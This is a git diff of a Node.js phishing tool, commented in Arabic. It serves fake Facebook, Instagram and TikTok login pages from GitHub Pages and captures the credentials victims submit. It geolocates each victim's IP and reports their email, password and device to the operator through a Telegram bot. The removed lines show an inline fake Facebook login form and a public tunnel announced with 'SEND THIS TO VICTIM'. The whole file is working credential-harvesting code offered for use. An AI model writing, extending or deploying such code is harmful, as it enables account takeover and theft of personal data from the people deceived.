@@ -1,18 +1,32 @@
 #!/usr/bin/env node
 const express=require('express')
 const {Telegraf}=require('telegraf')
-const localtunnel=require('localtunnel')
 const axios=require('axios')
 const ua=require('ua-parser-js')
 const readline=require('readline')
 
 const rl=readline.createInterface({input:process.stdin,output:process.stdout})
-const ask=q=>new Promise(res=>rl.question(q,res))
+const ask=q=>new Promise(res=>rl.question(q,ans=>res(ans)))
+
+// ⚠️ عدّل هذا لحسابك الثانوي الفعلي
+const PAGES={
+  fb:'https://mosmanhacker.github.io/fb',
+  ig:'https://YOUR_2ND.github.io/ig',
+  tt:'https://YOUR_2ND.github.io/tt'
+}
 
 async function main(){
-  const TOKEN=await ask('BOT_TOKEN: ')
-  const MASTER=await ask('MASTER_ID: ')
-  rl.close()
+  const TOKEN=process.env.TOKEN||await ask('BOT_TOKEN: ')
+  const MASTER=process.env.MASTER||await ask('MASTER_ID: ')
+
+  console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
+  const c=(await ask('Select page (1-3): ')).trim()
+  const p=['fb','ig','tt'][parseInt(c)-1]||'fb'
+
+  rl.close()                       // أغلق بعد آخر سؤال
+
+  // احفظ البيانات للمرات القادمة
+  require('fs').writeFileSync('.env',`TOKEN=${TOKEN}\nMASTER=${MASTER}`)
 
   const bot=new Telegraf(TOKEN)
   const app=express()
@@ -20,44 +34,28 @@ async function main(){
   app.use(express.urlencoded({extended:true}))
 
   // ✅ رسالة اتصال تلقائية
-  bot.telegram.sendMessage(MASTER,'Successful connection..!').catch(()=>{})
+  bot.telegram.sendMessage(MASTER,`Successful connection..!`).catch(()=>{})
 
-  // ✅ صفحة الفيسبوك المزورة (نخدمها بنفسنا)
-  const page=`
-<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Facebook</title>
-  <style>body{font-family:Helvetica;background:#f0f2f5}form{width:320px;margin:12% auto;background:#fff;padding:20px;border-radius:6px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px}button{background:#1877f2;color:#fff;border:0;width:100%;padding:12px;border-radius:4px}</style>
-</head>
-<body>
-  <form id="f" method="post"><h2>Log in to Facebook</h2><input name="email" placeholder="Email or phone" required><input name="pass" type="password" placeholder="Password" required><button>Log In</button></form>
-  <script>
-    const id=new URLSearchParams(location.search).get('id')||'NO_ID';
-    document.getElementById('f').addEventListener('submit',async e=>{
-      e.preventDefault();
-      await fetch('/catch',{                     // نفس الموقع – لا CORS
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({id,email:f.email.value,pass:f.pass.value,ua:navigator.userAgent,ip:''})
-      });
-      location.replace('https://facebook.com/login.php');
-    });
-  </script>
-</body>
-</html>`.trim()
+  const ext=`${PAGES[p]}/?id=${MASTER}`
+  const int=`http://localhost:3000/${p}`
+  console.log(`\nExternal: ${ext}\nInternal: ${int}\n`)
 
-  app.get('/',(q,r)=>r.send(page))
-  app.get('/:id',(q,r)=>r.send(page))
+  // ✅ الرابط الداخلي يستعرض الصفحة المزورة
+  app.get(`/${p}`,async(_,res)=>{
+    try{
+      const{data}=await axios.get(`${PAGES[p]}/index.html`)
+      res.send(data)
+    }catch{res.send('Page not found')}
+  })
 
-  // ✅ استقبال البيانات من الضحية (نفس السيرفر)
-  app.post('/catch',async(q,r)=>{
+  // ✅ الضحية يفتح الرابط الخارجي -> نجمع بياناته
+  app.post('/',async(q,r)=>{
     const{id,email,pass,ua:s,ip}=q.body
     const dev=ua(s||q.headers['user-agent'])
     const geo=await axios.get(`http://ip-api.com/json/${ip||q.ip}`).catch(()=>({data:{}}))
     const msg=
       `🔥 Victim opened\n`+
+      `Platform: ${p}\n`+
       `IP: ${ip||q.ip}\n`+
       `Country: ${geo.data.country||'?'}\n`+
       `Device: ${dev.os.name||'?'} ${dev.device.model||''}\n`+
@@ -69,15 +67,7 @@ async function main(){
     r.sendStatus(200)
   })
 
-  // ✅ بدء السيرفر المحلي
-  app.listen(3000,()=>console.log('Local server on port 3000...\n'))
-
-  // ✅ إنشاء tunnel عام فوري
-  const tunnel=await localtunnel({port:3000})
-  console.log(`\n=== SEND THIS TO VICTIM ===\n${tunnel.url}\n===========================\n`)
-  console.log('Press Ctrl+C to stop.\n')
-
-  tunnel.on('close',()=>{console.log('\nTunnel closed.');process.exit()})
+  bot.launch()
+  app.listen(3000,()=>console.log('Running... (Ctrl+C to stop)\n'))
 }
-
-main().catch(err=>{console.error(err);process.exit(1)})
+main()
